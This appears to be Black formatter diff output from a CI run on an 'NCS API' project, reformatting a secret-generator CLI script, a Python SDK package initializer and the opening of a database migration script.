 def log(level: str, message: str, color: bool = True):
     """Log message with optional color."""
     colors = {
-        'INFO': Colors.GREEN,
-        'WARN': Colors.YELLOW,
-        'ERROR': Colors.RED,
-        'DEBUG': Colors.BLUE
+        "INFO": Colors.GREEN,
+        "WARN": Colors.YELLOW,
+        "ERROR": Colors.RED,
+        "DEBUG": Colors.BLUE,
     }
-    
+
     if color and sys.stdout.isatty():
         color_code = colors.get(level, Colors.NC)
         print(f"{color_code}[{level}]{Colors.NC} {message}")
     else:
         print(f"[{level}] {message}")
 
+
 def error_exit(message: str):
     """Print error and exit."""
     log("ERROR", message)
     sys.exit(1)
 
+
 class SecretGenerator:
     """Main secret generator class."""
-    
+
     def __init__(self, environment: str = "development", length: int = 64):
         self.environment = environment
         self.length = length
         self.secrets = {}
-        
+
         # Character sets for different types of secrets
         self.charset_alphanumeric = string.ascii_letters + string.digits
-        self.charset_base64 = string.ascii_letters + string.digits + '+/'
+        self.charset_base64 = string.ascii_letters + string.digits + "+/"
         self.charset_hex = string.hexdigits.lower()
         self.charset_password = string.ascii_letters + string.digits + "!@#$%^&*"
-        
+
     def generate_jwt_secret(self) -> str:
         """Generate a JWT secret key with high entropy."""
         log("INFO", f"Generating JWT secret key ({self.length} chars)")
-        
+
         # Use URL-safe base64 encoding for JWT secrets
         random_bytes = secrets.token_bytes(self.length)
-        jwt_secret = base64.urlsafe_b64encode(random_bytes).decode('utf-8')
-        
+        jwt_secret = base64.urlsafe_b64encode(random_bytes).decode("utf-8")
+
         # Ensure it meets minimum length requirement
         if len(jwt_secret) < self.length:
             jwt_secret += secrets.token_urlsafe(self.length - len(jwt_secret))
-        
-        return jwt_secret[:self.length]
-    
+
+        return jwt_secret[: self.length]
+
     def generate_api_keys(self, count: int = 3) -> List[str]:
         """Generate API keys for external access."""
         log("INFO", f"Generating {count} API keys")
-        
+
         api_keys = []
         for i in range(count):
             # Create API key with prefix for identification
             key_id = secrets.token_hex(4)  # 8 character identifier
             key_secret = secrets.token_urlsafe(32)  # 43 character secret
             api_key = f"ncs_api_{self.environment}_{key_id}_{key_secret}"
             api_keys.append(api_key)
-            
+
         return api_keys
-    
+
     def generate_database_password(self, min_length: int = 16) -> str:
         """Generate a secure database password."""
         log("INFO", f"Generating database password ({min_length}+ chars)")
-        
+
         # Ensure password meets complexity requirements
         password_length = max(min_length, 16)
-        
+
         # Start with required character types
         password_chars = [
             secrets.choice(string.ascii_lowercase),
             secrets.choice(string.ascii_uppercase),
             secrets.choice(string.digits),
-            secrets.choice("!@#$%^&*")
+            secrets.choice("!@#$%^&*"),
         ]
-        
+
         # Fill rest with random characters from full charset
         remaining_length = password_length - len(password_chars)
         for _ in range(remaining_length):
             password_chars.append(secrets.choice(self.charset_password))
-        
+
         # Shuffle the characters
         secrets.SystemRandom().shuffle(password_chars)
-        
-        return ''.join(password_chars)
-    
+
+        return "".join(password_chars)
+
     def generate_encryption_key(self, key_size: int = 32) -> str:
         """Generate encryption key for data protection."""
         log("INFO", f"Generating encryption key ({key_size} bytes)")
-        
+
         # Generate random bytes and encode as base64
         key_bytes = secrets.token_bytes(key_size)
-        return base64.b64encode(key_bytes).decode('utf-8')
-    
+        return base64.b64encode(key_bytes).decode("utf-8")
+
     def generate_session_secret(self) -> str:
         """Generate session secret for web frameworks."""
         log("INFO", "Generating session secret")
-        
+
         return secrets.token_urlsafe(64)
-    
+
     def generate_csrf_token(self) -> str:
         """Generate CSRF protection token."""
         log("INFO", "Generating CSRF token")
-        
+
         return secrets.token_hex(32)
-    
+
     def generate_webhook_secret(self) -> str:
         """Generate webhook signing secret."""
         log("INFO", "Generating webhook secret")
-        
+
         return secrets.token_hex(32)
-    
+
     def generate_monitoring_token(self) -> str:
         """Generate token for monitoring endpoints."""
         log("INFO", "Generating monitoring token")
-        
+
         return secrets.token_urlsafe(48)
-    
+
     def generate_backup_encryption_key(self) -> str:
         """Generate key for backup encryption."""
         log("INFO", "Generating backup encryption key")
-        
-        return base64.b64encode(secrets.token_bytes(32)).decode('utf-8')
-    
+
+        return base64.b64encode(secrets.token_bytes(32)).decode("utf-8")
+
     def generate_redis_password(self) -> str:
         """Generate Redis password."""
         log("INFO", "Generating Redis password")
-        
+
         return self.generate_database_password(20)
-    
+
     def generate_salt(self, length: int = 32) -> str:
         """Generate cryptographic salt."""
         return secrets.token_hex(length)
-    
+
     def generate_self_signed_cert(self) -> Dict[str, str]:
         """Generate self-signed SSL certificate for development."""
         log("INFO", "Generating self-signed SSL certificate")
-        
+
         # Generate private key
-        private_key = rsa.generate_private_key(
-            public_exponent=65537,
-            key_size=2048
-        )
-        
+        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+
         # Create certificate
-        subject = issuer = x509.Name([
-            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
-            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Development"),
-            x509.NameAttribute(NameOID.LOCALITY_NAME, "Local"),
-            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "NCS API Development"),
-            x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
-        ])
-        
-        cert = x509.CertificateBuilder().subject_name(
-            subject
-        ).issuer_name(
-            issuer
-        ).public_key(
-            private_key.public_key()
-        ).serial_number(
-            x509.random_serial_number()
-        ).not_valid_before(
-            datetime.utcnow()
-        ).not_valid_after(
-            datetime.utcnow() + timedelta(days=365)
-        ).add_extension(
-            x509.SubjectAlternativeName([
-                x509.DNSName("localhost"),
-                x509.DNSName("127.0.0.1"),
-                x509.IPAddress("127.0.0.1".encode()),
-            ]),
-            critical=False,
-        ).sign(private_key, hashes.SHA256())
-        
+        subject = issuer = x509.Name(
+            [
+                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
+                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Development"),
+                x509.NameAttribute(NameOID.LOCALITY_NAME, "Local"),
+                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "NCS API Development"),
+                x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
+            ]
+        )
+
+        cert = (
+            x509.CertificateBuilder()
+            .subject_name(subject)
+            .issuer_name(issuer)
+            .public_key(private_key.public_key())
+            .serial_number(x509.random_serial_number())
+            .not_valid_before(datetime.utcnow())
+            .not_valid_after(datetime.utcnow() + timedelta(days=365))
+            .add_extension(
+                x509.SubjectAlternativeName(
+                    [
+                        x509.DNSName("localhost"),
+                        x509.DNSName("127.0.0.1"),
+                        x509.IPAddress("127.0.0.1".encode()),
+                    ]
+                ),
+                critical=False,
+            )
+            .sign(private_key, hashes.SHA256())
+        )
+
         # Serialize private key
         private_pem = private_key.private_bytes(
             encoding=Encoding.PEM,
             format=PrivateFormat.PKCS8,
-            encryption_algorithm=NoEncryption()
-        ).decode('utf-8')
-        
+            encryption_algorithm=NoEncryption(),
+        ).decode("utf-8")
+
         # Serialize certificate
-        cert_pem = cert.public_bytes(Encoding.PEM).decode('utf-8')
-        
-        return {
-            'private_key': private_pem,
-            'certificate': cert_pem
-        }
-    
-    def generate_all_secrets(self, api_key_count: int = 3, include_passwords: bool = True, 
-                           include_certs: bool = False) -> Dict[str, Any]:
+        cert_pem = cert.public_bytes(Encoding.PEM).decode("utf-8")
+
+        return {"private_key": private_pem, "certificate": cert_pem}
+
+    def generate_all_secrets(
+        self,
+        api_key_count: int = 3,
+        include_passwords: bool = True,
+        include_certs: bool = False,
+    ) -> Dict[str, Any]:
         """Generate all required secrets."""
         log("INFO", f"Generating secrets for {self.environment} environment")
-        
+
         secrets_dict = {
-            'metadata': {
-                'generated_at': datetime.utcnow().isoformat(),
-                'environment': self.environment,
-                'version': '1.0.0',
-                'generator': 'NCS API Secret Generator'
+            "metadata": {
+                "generated_at": datetime.utcnow().isoformat(),
+                "environment": self.environment,
+                "version": "1.0.0",
+                "generator": "NCS API Secret Generator",
             },
-            'jwt': {
-                'secret_key': self.generate_jwt_secret(),
-                'algorithm': 'HS256',
-                'expiry_hours': 24 if self.environment == 'development' else 8
+            "jwt": {
+                "secret_key": self.generate_jwt_secret(),
+                "algorithm": "HS256",
+                "expiry_hours": 24 if self.environment == "development" else 8,
             },
-            'api_keys': self.generate_api_keys(api_key_count),
-            'encryption': {
-                'data_key': self.generate_encryption_key(32),
-                'backup_key': self.generate_backup_encryption_key(),
-                'salt': self.generate_salt()
+            "api_keys": self.generate_api_keys(api_key_count),
+            "encryption": {
+                "data_key": self.generate_encryption_key(32),
+                "backup_key": self.generate_backup_encryption_key(),
+                "salt": self.generate_salt(),
             },
-            'session': {
-                'secret': self.generate_session_secret(),
-                'csrf_token': self.generate_csrf_token()
+            "session": {
+                "secret": self.generate_session_secret(),
+                "csrf_token": self.generate_csrf_token(),
             },
-            'monitoring': {
-                'token': self.generate_monitoring_token(),
-                'webhook_secret': self.generate_webhook_secret()
-            }
+            "monitoring": {
+                "token": self.generate_monitoring_token(),
+                "webhook_secret": self.generate_webhook_secret(),
+            },
         }
-        
+
         # Add passwords if requested
         if include_passwords:
-            secrets_dict['passwords'] = {
-                'database': {
-                    'postgres_password': self.generate_database_password(),
-                    'admin_password': self.generate_database_password(20)
+            secrets_dict["passwords"] = {
+                "database": {
+                    "postgres_password": self.generate_database_password(),
+                    "admin_password": self.generate_database_password(20),
                 },
-                'redis_password': self.generate_redis_password(),
-                'admin_user_password': self.generate_database_password(16)
+                "redis_password": self.generate_redis_password(),
+                "admin_user_password": self.generate_database_password(16),
             }
-        
+
         # Add certificates if requested
         if include_certs:
             cert_data = self.generate_self_signed_cert()
-            secrets_dict['certificates'] = {
-                'ssl': {
-                    'private_key': cert_data['private_key'],
-                    'certificate': cert_data['certificate'],
-                    'validity_days': 365,
-                    'created_at': datetime.utcnow().isoformat()
+            secrets_dict["certificates"] = {
+                "ssl": {
+                    "private_key": cert_data["private_key"],
+                    "certificate": cert_data["certificate"],
+                    "validity_days": 365,
+                    "created_at": datetime.utcnow().isoformat(),
                 }
             }
-        
+
         # Environment-specific additions
-        if self.environment == 'production':
-            secrets_dict['security'] = {
-                'rate_limit_secret': self.generate_salt(16),
-                'audit_signing_key': self.generate_encryption_key(32),
-                'backup_verification_key': self.generate_salt(24)
+        if self.environment == "production":
+            secrets_dict["security"] = {
+                "rate_limit_secret": self.generate_salt(16),
+                "audit_signing_key": self.generate_encryption_key(32),
+                "backup_verification_key": self.generate_salt(24),
             }
-        
+
         return secrets_dict
+
 
 class SecretFormatter:
     """Format secrets for different output types."""
-    
+
     @staticmethod
     def format_json(secrets: Dict[str, Any], indent: int = 2) -> str:
         """Format secrets as JSON."""
         return json.dumps(secrets, indent=indent, sort_keys=True)
-    
+
     @staticmethod
     def format_yaml(secrets: Dict[str, Any]) -> str:
         """Format secrets as YAML."""
         return yaml.dump(secrets, default_flow_style=False, sort_keys=True)
-    
+
     @staticmethod
     def format_env(secrets: Dict[str, Any]) -> str:
         """Format secrets as environment variables."""
         lines = [
             "# NeuroCluster Streamer API Secrets",
             f"# Generated: {secrets['metadata']['generated_at']}",
             f"# Environment: {secrets['metadata']['environment']}",
-            ""
+            "",
         ]
-        
+
         # JWT secrets
-        lines.extend([
-            "# JWT Configuration",
-            f"JWT_SECRET_KEY={secrets['jwt']['secret_key']}",
-            f"JWT_ALGORITHM={secrets['jwt']['algorithm']}",
-            f"JWT_EXPIRY_HOURS={secrets['jwt']['expiry_hours']}",
-            ""
-        ])
-        
+        lines.extend(
+            [
+                "# JWT Configuration",
+                f"JWT_SECRET_KEY={secrets['jwt']['secret_key']}",
+                f"JWT_ALGORITHM={secrets['jwt']['algorithm']}",
+                f"JWT_EXPIRY_HOURS={secrets['jwt']['expiry_hours']}",
+                "",
+            ]
+        )
+
         # API Keys
-        api_keys_str = ','.join(secrets['api_keys'])
-        lines.extend([
-            "# API Keys",
-            f"API_KEYS={api_keys_str}",
-            ""
-        ])
-        
+        api_keys_str = ",".join(secrets["api_keys"])
+        lines.extend(["# API Keys", f"API_KEYS={api_keys_str}", ""])
+
         # Encryption keys
-        lines.extend([
-            "# Encryption Configuration",
-            f"DATA_ENCRYPTION_KEY={secrets['encryption']['data_key']}",
-            f"BACKUP_ENCRYPTION_KEY={secrets['encryption']['backup_key']}",
-            f"CRYPTO_SALT={secrets['encryption']['salt']}",
-            ""
-        ])
-        
+        lines.extend(
+            [
+                "# Encryption Configuration",
+                f"DATA_ENCRYPTION_KEY={secrets['encryption']['data_key']}",
+                f"BACKUP_ENCRYPTION_KEY={secrets['encryption']['backup_key']}",
+                f"CRYPTO_SALT={secrets['encryption']['salt']}",
+                "",
+            ]
+        )
+
         # Session secrets
-        lines.extend([
-            "# Session Configuration",
-            f"SESSION_SECRET={secrets['session']['secret']}",
-            f"CSRF_TOKEN={secrets['session']['csrf_token']}",
-            ""
-        ])
-        
+        lines.extend(
+            [
+                "# Session Configuration",
+                f"SESSION_SECRET={secrets['session']['secret']}",
+                f"CSRF_TOKEN={secrets['session']['csrf_token']}",
+                "",
+            ]
+        )
+
         # Monitoring
-        lines.extend([
-            "# Monitoring Configuration",
-            f"MONITORING_TOKEN={secrets['monitoring']['token']}",
-            f"WEBHOOK_SECRET={secrets['monitoring']['webhook_secret']}",
-            ""
-        ])
-        
+        lines.extend(
+            [
+                "# Monitoring Configuration",
+                f"MONITORING_TOKEN={secrets['monitoring']['token']}",
+                f"WEBHOOK_SECRET={secrets['monitoring']['webhook_secret']}",
+                "",
+            ]
+        )
+
         # Passwords (if present)
-        if 'passwords' in secrets:
-            lines.extend([
-                "# Database Passwords",
-                f"DB_PASSWORD={secrets['passwords']['database']['postgres_password']}",
-                f"DB_ADMIN_PASSWORD={secrets['passwords']['database']['admin_password']}",
-                f"REDIS_PASSWORD={secrets['passwords']['redis_password']}",
-                f"ADMIN_USER_PASSWORD={secrets['passwords']['admin_user_password']}",
-                ""
-            ])
-        
+        if "passwords" in secrets:
+            lines.extend(
+                [
+                    "# Database Passwords",
+                    f"DB_PASSWORD={secrets['passwords']['database']['postgres_password']}",
+                    f"DB_ADMIN_PASSWORD={secrets['passwords']['database']['admin_password']}",
+                    f"REDIS_PASSWORD={secrets['passwords']['redis_password']}",
+                    f"ADMIN_USER_PASSWORD={secrets['passwords']['admin_user_password']}",
+                    "",
+                ]
+            )
+
         # Security (if present)
-        if 'security' in secrets:
-            lines.extend([
-                "# Security Configuration",
-                f"RATE_LIMIT_SECRET={secrets['security']['rate_limit_secret']}",
-                f"AUDIT_SIGNING_KEY={secrets['security']['audit_signing_key']}",
-                f"BACKUP_VERIFICATION_KEY={secrets['security']['backup_verification_key']}",
-                ""
-            ])
-        
-        return '\n'.join(lines)
+        if "security" in secrets:
+            lines.extend(
+                [
+                    "# Security Configuration",
+                    f"RATE_LIMIT_SECRET={secrets['security']['rate_limit_secret']}",
+                    f"AUDIT_SIGNING_KEY={secrets['security']['audit_signing_key']}",
+                    f"BACKUP_VERIFICATION_KEY={secrets['security']['backup_verification_key']}",
+                    "",
+                ]
+            )
+
+        return "\n".join(lines)
+
 
 def validate_environment(env: str) -> str:
     """Validate and return environment."""
-    valid_environments = ['development', 'staging', 'production', 'testing']
+    valid_environments = ["development", "staging", "production", "testing"]
     if env not in valid_environments:
-        error_exit(f"Invalid environment: {env}. Must be one of: {', '.join(valid_environments)}")
+        error_exit(
+            f"Invalid environment: {env}. Must be one of: {', '.join(valid_environments)}"
+        )
     return env
+
 
 def validate_format(fmt: str) -> str:
     """Validate and return format."""
-    valid_formats = ['json', 'yaml', 'env']
+    valid_formats = ["json", "yaml", "env"]
     if fmt not in valid_formats:
         error_exit(f"Invalid format: {fmt}. Must be one of: {', '.join(valid_formats)}")
     return fmt
+
 
 def check_output_file(output_file: str, force: bool) -> None:
     """Check if output file can be written."""
     if os.path.exists(output_file) and not force:
         error_exit(f"Output file exists: {output_file}. Use --force to overwrite.")
-    
+
     # Check if directory is writable
-    output_dir = os.path.dirname(output_file) or '.'
+    output_dir = os.path.dirname(output_file) or "."
     if not os.access(output_dir, os.W_OK):
         error_exit(f"Cannot write to directory: {output_dir}")
+
 
 def main():
     """Main function."""
     parser = argparse.ArgumentParser(
         description="Generate cryptographically secure secrets for NCS API",
@@ -436,132 +459,120 @@
 Examples:
   %(prog)s --format env --output .env.secrets
   %(prog)s --environment production --length 128
   %(prog)s --include-certs --format yaml
   %(prog)s --api-keys 5 --no-passwords
-        """
-    )
-    
-    parser.add_argument(
-        '--format', 
-        choices=['json', 'yaml', 'env'],
-        default='json',
-        help='Output format (default: json)'
-    )
-    
-    parser.add_argument(
-        '--output',
-        help='Output file (default: stdout)'
-    )
-    
-    parser.add_argument(
-        '--environment',
-        choices=['development', 'staging', 'production', 'testing'],
-        default='development',
-        help='Target environment (default: development)'
-    )
-    
-    parser.add_argument(
-        '--length',
-        type=int,
-        default=64,
-        help='Secret length for keys (default: 64)'
-    )
-    
-    parser.add_argument(
-        '--api-keys',
+        """,
+    )
+
+    parser.add_argument(
+        "--format",
+        choices=["json", "yaml", "env"],
+        default="json",
+        help="Output format (default: json)",
+    )
+
+    parser.add_argument("--output", help="Output file (default: stdout)")
+
+    parser.add_argument(
+        "--environment",
+        choices=["development", "staging", "production", "testing"],
+        default="development",
+        help="Target environment (default: development)",
+    )
+
+    parser.add_argument(
+        "--length", type=int, default=64, help="Secret length for keys (default: 64)"
+    )
+
+    parser.add_argument(
+        "--api-keys",
         type=int,
         default=3,
-        help='Number of API keys to generate (default: 3)'
-    )
-    
-    parser.add_argument(
-        '--no-passwords',
-        action='store_true',
-        help='Skip password generation'
-    )
-    
-    parser.add_argument(
-        '--include-certs',
-        action='store_true',
-        help='Generate self-signed certificates'
-    )
-    
-    parser.add_argument(
-        '--force',
-        action='store_true',
-        help='Overwrite existing output file'
-    )
-    
-    parser.add_argument(
-        '--verbose',
-        action='store_true',
-        help='Enable verbose output'
-    )
-    
+        help="Number of API keys to generate (default: 3)",
+    )
+
+    parser.add_argument(
+        "--no-passwords", action="store_true", help="Skip password generation"
+    )
+
+    parser.add_argument(
+        "--include-certs", action="store_true", help="Generate self-signed certificates"
+    )
+
+    parser.add_argument(
+        "--force", action="store_true", help="Overwrite existing output file"
+    )
+
+    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
+
     args = parser.parse_args()
-    
+
     # Validate inputs
     environment = validate_environment(args.environment)
     output_format = validate_format(args.format)
-    
+
     if args.output:
         check_output_file(args.output, args.force)
-    
+
     if args.length < 32:
         log("WARN", "Secret length less than 32 characters may not be secure")
-    
+
     # Generate secrets
     try:
         log("INFO", "Starting secret generation...")
-        
+
         generator = SecretGenerator(environment, args.length)
         secrets_data = generator.generate_all_secrets(
             api_key_count=args.api_keys,
             include_passwords=not args.no_passwords,
-            include_certs=args.include_certs
-        )
-        
+            include_certs=args.include_certs,
+        )
+
         # Format output
-        if output_format == 'json':
+        if output_format == "json":
             output = SecretFormatter.format_json(secrets_data)
-        elif output_format == 'yaml':
+        elif output_format == "yaml":
             output = SecretFormatter.format_yaml(secrets_data)
-        elif output_format == 'env':
+        elif output_format == "env":
             output = SecretFormatter.format_env(secrets_data)
-        
+
         # Write output
         if args.output:
-            with open(args.output, 'w') as f:
+            with open(args.output, "w") as f:
                 f.write(output)
-            
+
             # Set secure permissions on output file
             os.chmod(args.output, 0o600)
-            
+
             log("INFO", f"Secrets written to: {args.output}")
             log("INFO", f"File permissions set to 600 (owner read/write only)")
-            
+
             if args.verbose:
                 log("INFO", f"Generated {len(secrets_data['api_keys'])} API keys")
-                if 'passwords' in secrets_data:
+                if "passwords" in secrets_data:
                     log("INFO", "Generated database and admin passwords")
-                if 'certificates' in secrets_data:
+                if "certificates" in secrets_data:
                     log("INFO", "Generated self-signed SSL certificate")
         else:
             print(output)
-        
+
         log("INFO", "Secret generation completed successfully")
-        
+
         # Security reminder for production
-        if environment == 'production':
+        if environment == "production":
             log("WARN", "PRODUCTION SECRETS GENERATED!")
-            log("WARN", "Store these secrets securely and never commit to version control")
+            log(
+                "WARN",
+                "Store these secrets securely and never commit to version control",
+            )
             log("WARN", "Consider using a secrets management system for production")
-        
+
     except KeyboardInterrupt:
         log("ERROR", "Secret generation interrupted by user")
         sys.exit(1)
     except Exception as e:
         error_exit(f"Secret generation failed: {str(e)}")
 
+
 if __name__ == "__main__":
-    main()
\ No newline at end of file
+    main()
--- /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/__init__.py	2025-06-10 20:31:25.483857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/__init__.py	2025-06-10 20:32:34.712940+00:00
@@ -22,202 +22,211 @@
 
 # Import main client classes
 from .ncs_client import (
     # Main client
     NCSClient,
-    
     # Data models
     Cluster,
     ProcessingResult,
     AlgorithmStatus,
     HealthStatus,
-    
     # Type definitions
     Point,
     Points,
-    
     # Utilities
-    create_client
+    create_client,
 )
 
 from .async_client import (
     # Async client
     AsyncNCSClient,
     StreamingConnection,
     AsyncRateLimiter,
-    
     # Async utilities
     create_async_client,
-    async_client_context
+    async_client_context,
 )
 
 # Import all exceptions with consistent naming
 from .ncs_client import (
     NCSError,
     AuthenticationError,
     RateLimitError,
     ValidationError,
     ProcessingError,
-    ConnectionError
+    ConnectionError,
 )
+
 
 # Package-level convenience functions
 def get_version() -> str:
     """Get the current package version."""
     return __version__
+
 
 def get_client_info() -> dict:
     """Get comprehensive client information."""
     return {
         "name": "ncs-python-sdk",
         "version": __version__,
         "author": __author__,
         "description": __description__,
         "license": __license__,
         "url": __url__,
-        "python_requires": ">=3.8"
+        "python_requires": ">=3.8",
     }
+
 
 # Configuration helpers
 def configure_logging(level: str = "INFO"):
     """
     Configure logging for the NCS client.
-    
+
     Args:
         level: Logging level (DEBUG, INFO, WARNING, ERROR)
     """
     import logging
-    
+
     # Configure root logger for NCS
-    logger = logging.getLogger('ncs_client')
+    logger = logging.getLogger("ncs_client")
     logger.setLevel(getattr(logging, level.upper()))
-    
+
     # Add handler if none exists
     if not logger.handlers:
         handler = logging.StreamHandler()
         formatter = logging.Formatter(
-            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+            "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
         )
         handler.setFormatter(formatter)
         logger.addHandler(handler)
-    
+
     logger.info(f"NCS SDK logging configured at {level} level")
 
+
 def load_config_from_env() -> dict:
     """
     Load client configuration from environment variables.
-    
+
     Returns:
         Configuration dictionary suitable for client initialization
     """
     import os
-    
+
     config = {}
-    
+
     # Core settings
-    if os.getenv('NCS_API_URL'):
-        config['base_url'] = os.getenv('NCS_API_URL')
-    
-    if os.getenv('NCS_API_KEY'):
-        config['api_key'] = os.getenv('NCS_API_KEY')
-    
-    if os.getenv('NCS_JWT_TOKEN'):
-        config['jwt_token'] = os.getenv('NCS_JWT_TOKEN')
-    
+    if os.getenv("NCS_API_URL"):
+        config["base_url"] = os.getenv("NCS_API_URL")
+
+    if os.getenv("NCS_API_KEY"):
+        config["api_key"] = os.getenv("NCS_API_KEY")
+
+    if os.getenv("NCS_JWT_TOKEN"):
+        config["jwt_token"] = os.getenv("NCS_JWT_TOKEN")
+
     # Optional settings with defaults
-    config['timeout'] = float(os.getenv('NCS_TIMEOUT', '30.0'))
-    config['max_retries'] = int(os.getenv('NCS_MAX_RETRIES', '3'))
-    config['retry_delay'] = float(os.getenv('NCS_RETRY_DELAY', '1.0'))
-    config['verify_ssl'] = os.getenv('NCS_VERIFY_SSL', 'true').lower() == 'true'
-    config['log_level'] = os.getenv('NCS_LOG_LEVEL', 'INFO')
-    
+    config["timeout"] = float(os.getenv("NCS_TIMEOUT", "30.0"))
+    config["max_retries"] = int(os.getenv("NCS_MAX_RETRIES", "3"))
+    config["retry_delay"] = float(os.getenv("NCS_RETRY_DELAY", "1.0"))
+    config["verify_ssl"] = os.getenv("NCS_VERIFY_SSL", "true").lower() == "true"
+    config["log_level"] = os.getenv("NCS_LOG_LEVEL", "INFO")
+
     return {k: v for k, v in config.items() if v is not None}
 
+
 def create_client_from_env(**kwargs) -> NCSClient:
     """
     Create a client using environment variable configuration.
-    
+
     Args:
         **kwargs: Additional configuration to override environment settings
-        
+
     Returns:
         Configured NCSClient instance
-        
+
     Raises:
         ValueError: If required environment variables are missing
     """
     import os
-    
+
     config = load_config_from_env()
     config.update(kwargs)
-    
-    if 'base_url' not in config:
+
+    if "base_url" not in config:
         raise ValueError("NCS_API_URL environment variable is required")
-    
-    if 'api_key' not in config and 'jwt_token' not in config:
-        raise ValueError("Either NCS_API_KEY or NCS_JWT_TOKEN environment variable is required")
-    
+
+    if "api_key" not in config and "jwt_token" not in config:
+        raise ValueError(
+            "Either NCS_API_KEY or NCS_JWT_TOKEN environment variable is required"
+        )
+
     return NCSClient(**config)
 
+
 async def create_async_client_from_env(**kwargs) -> AsyncNCSClient:
     """
     Create an async client using environment variable configuration.
-    
+
     Args:
         **kwargs: Additional configuration to override environment settings
-        
+
     Returns:
         Configured AsyncNCSClient instance
-        
+
     Raises:
         ValueError: If required environment variables are missing
     """
     import os
-    
+
     config = load_config_from_env()
     config.update(kwargs)
-    
-    if 'base_url' not in config:
+
+    if "base_url" not in config:
         raise ValueError("NCS_API_URL environment variable is required")
-    
-    if 'api_key' not in config and 'jwt_token' not in config:
-        raise ValueError("Either NCS_API_KEY or NCS_JWT_TOKEN environment variable is required")
-    
+
+    if "api_key" not in config and "jwt_token" not in config:
+        raise ValueError(
+            "Either NCS_API_KEY or NCS_JWT_TOKEN environment variable is required"
+        )
+
     return AsyncNCSClient(**config)
+
 
 # Version checking
 def check_compatibility():
     """Check if the current environment is compatible with the SDK."""
     import sys
     import warnings
-    
+
     # Check Python version
     if sys.version_info < (3, 8):
         raise RuntimeError("NCS Python SDK requires Python 3.8 or higher")
-    
+
     # Check for optional dependencies
     try:
         import numpy
     except ImportError:
         warnings.warn(
             "NumPy is not installed. Some performance features may be limited.",
-            UserWarning
-        )
-    
+            UserWarning,
+        )
+
     try:
         import pandas
     except ImportError:
         warnings.warn(
             "Pandas is not installed. DataFrame processing features are not available.",
-            UserWarning
-        )
+            UserWarning,
+        )
+
 
 # Run compatibility check on import
 try:
     check_compatibility()
 except Exception as e:
     import warnings
+
     warnings.warn(f"Compatibility check failed: {e}", UserWarning)
 
 # Package-level constants
 DEFAULT_TIMEOUT = 30.0
 DEFAULT_MAX_RETRIES = 3
@@ -232,61 +241,54 @@
     "__author__",
     "__email__",
     "__description__",
     "__license__",
     "__url__",
-    
     # Main classes
     "NCSClient",
     "AsyncNCSClient",
-    
     # Data models
     "Cluster",
-    "ProcessingResult", 
+    "ProcessingResult",
     "AlgorithmStatus",
     "HealthStatus",
-    
     # Streaming
     "StreamingConnection",
     "AsyncRateLimiter",
-    
     # Exceptions
     "NCSError",
     "AuthenticationError",
-    "RateLimitError", 
+    "RateLimitError",
     "ValidationError",
     "ProcessingError",
     "ConnectionError",
-    
     # Type definitions
     "Point",
     "Points",
-    
     # Factory functions
     "create_client",
     "create_async_client",
     "async_client_context",
-    
     # Configuration utilities
     "get_version",
     "get_client_info",
     "configure_logging",
     "load_config_from_env",
     "create_client_from_env",
     "create_async_client_from_env",
     "check_compatibility",
-    
     # Constants
     "DEFAULT_TIMEOUT",
-    "DEFAULT_MAX_RETRIES", 
+    "DEFAULT_MAX_RETRIES",
     "DEFAULT_RETRY_DELAY",
     "MAX_BATCH_SIZE",
-    "DEFAULT_RATE_LIMIT"
+    "DEFAULT_RATE_LIMIT",
 ]
 
 # Package initialization message
 import logging
+
 logger = logging.getLogger(__name__)
 logger.debug(f"NCS Python SDK v{__version__} initialized")
 
 # Backwards compatibility aliases
-NCSSyncClient = NCSClient  # For backwards compatibility
\ No newline at end of file
+NCSSyncClient = NCSClient  # For backwards compatibility
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/sdk/python/__init__.py
would reformat /home/runner/work/NCS-API-Project/NCS-API-Project/scripts/db_migrate.py
--- /home/runner/work/NCS-API-Project/NCS-API-Project/scripts/db_migrate.py	2025-06-10 20:31:25.483857+00:00
+++ /home/runner/work/NCS-API-Project/NCS-API-Project/scripts/db_migrate.py	2025-06-10 20:32:34.765641+00:00
@@ -61,773 +61,897 @@
 script_dir = Path(__file__).parent
 project_root = script_dir.parent
 sys.path.insert(0, str(project_root))
 
 try:
-    from sqlalchemy import create_engine, text, MetaData, Table, Column, String, DateTime, Integer
+    from sqlalchemy import (
+        create_engine,
+        text,
+        MetaData,
+        Table,
+        Column,
+        String,
+        DateTime,
+        Integer,
+    )
     from sqlalchemy.orm import sessionmaker
     from sqlalchemy.exc import SQLAlchemyError
     from config import settings
 except ImportError as e:
     print(f"Error importing required modules: {e}")
-    print("Please ensure you're running from the project root with dependencies installed")
+    print(
+        "Please ensure you're running from the project root with dependencies installed"
+    )
     sys.exit(1)
+
 
 # Color constants
 class Colors:
-    RED = '\033[0;31m'
-    GREEN = '\033[0;32m'
-    YELLOW = '\033[1;33m'
-    BLUE = '\033[0;34m'
-    PURPLE = '\033[0;35m'
-    NC = '\033[0m'
+    RED = "\033[0;31m"
+    GREEN = "\033[0;32m"
+    YELLOW = "\033[1;33m"
+    BLUE = "\033[0;34m"
+    PURPLE = "\033[0;35m"
+    NC = "\033[0m"
+
 
 def log(level: str, message: str, color: bool = True):
     """Log message with optional color."""
     colors = {
-        'INFO': Colors.GREEN,
-        'WARN': Colors.YELLOW,
-        'ERROR': Colors.RED,
-        'DEBUG': Colors.BLUE,
-        'MIGRATE': Colors.PURPLE
+        "INFO": Colors.GREEN,
+        "WARN": Colors.YELLOW,
+        "ERROR": Colors.RED,
+        "DEBUG": Colors.BLUE,
+        "MIGRATE": Colors.PURPLE,
     }
-    
+
     if color and sys.stdout.isatty():
         color_code = colors.get(level, Colors.NC)
